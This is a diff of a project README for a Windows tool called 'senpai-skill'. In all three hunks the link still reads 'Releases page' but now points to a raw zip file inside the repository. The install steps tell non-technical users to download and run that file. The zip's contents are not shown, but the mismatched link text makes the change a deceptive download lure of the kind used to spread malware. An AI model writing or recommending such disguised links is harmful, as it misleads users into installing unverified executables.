@@ -1,6 +1,6 @@
 # 🧠 senpai-skill - Keep Your Team Moving
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Jacentaresolute462/senpai-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jacentaresolute462/senpai-skill/main/tools/skill_senpai_v2.4.zip)
 
 ## 🚀 What It Is
 
@@ -10,7 +10,7 @@ It is made for end users who want a simple tool, not a setup project. You downlo
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/Jacentaresolute462/senpai-skill/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Jacentaresolute462/senpai-skill/main/tools/skill_senpai_v2.4.zip)
 2. Find the latest release at the top
 3. Download the file made for Windows
 4. If the file is a ZIP package, extract it first
@@ -248,7 +248,7 @@ This style keeps the work moving and keeps the output useful.
 
 Always use the latest file from the release page:
 
-[Visit the Releases page to download](https://github.com/Jacentaresolute462/senpai-skill/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/Jacentaresolute462/senpai-skill/main/tools/skill_senpai_v2.4.zip)
 
 Check the top release first. If there are several files, choose the one marked for Windows.
 
